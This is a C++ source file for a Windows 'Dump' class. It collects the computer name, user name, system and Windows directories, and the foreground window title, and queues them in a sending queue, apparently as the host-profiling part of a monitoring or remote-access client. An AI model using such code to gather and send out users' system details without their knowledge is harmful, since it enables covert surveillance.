#include "Dump.hpp"

Dump::Dump(std::deque<std::pair<Request, std::string>> &sendingQueue) : _sendingQueue(sendingQueue) {
}

Dump::~Dump() {
}

Dump &Dump::operator=(const Dump &obj) {
    return (*this);
}

Dump::Dump(const Dump &obj) : _sendingQueue(obj._sendingQueue) {
}

void Dump::setup() {
	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;

	bufCharCount = INFO_BUFFER_SIZE;
	if (GetComputerName(infoBuf, &bufCharCount)) {
		this->_sendingQueue.push_front(std::make_pair(Request::DUMP_COMPUTER_NAME, infoBuf));
		this->_computerName = infoBuf;
	}

	bufCharCount = INFO_BUFFER_SIZE;
	if (GetUserName(infoBuf, &bufCharCount))
		this->_sendingQueue.push_front(std::make_pair(Request::DUMP_USER_NAME, infoBuf));

	if (GetSystemDirectory(infoBuf, INFO_BUFFER_SIZE))
		this->_sendingQueue.push_front(std::make_pair(Request::DUMP_SYS_DIR, infoBuf));

	if (GetWindowsDirectory(infoBuf, INFO_BUFFER_SIZE))
		this->_sendingQueue.push_front(std::make_pair(Request::DUMP_USER_DIR, infoBuf));
}

void Dump::update() {
    this->setup();
}

std::string const Dump::getTimestamp() const {
	std::chrono::milliseconds ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch());
	return std::to_string(ms.count());
}

std::string const Dump::getComputerName() const {
	return this->_computerName;
}

std::string const Dump::getWinName() const {
	HWND win = GetForegroundWindow();
	char wnd_title[256];
	GetWindowText(win, wnd_title, sizeof(wnd_title));
	return wnd_title;
}
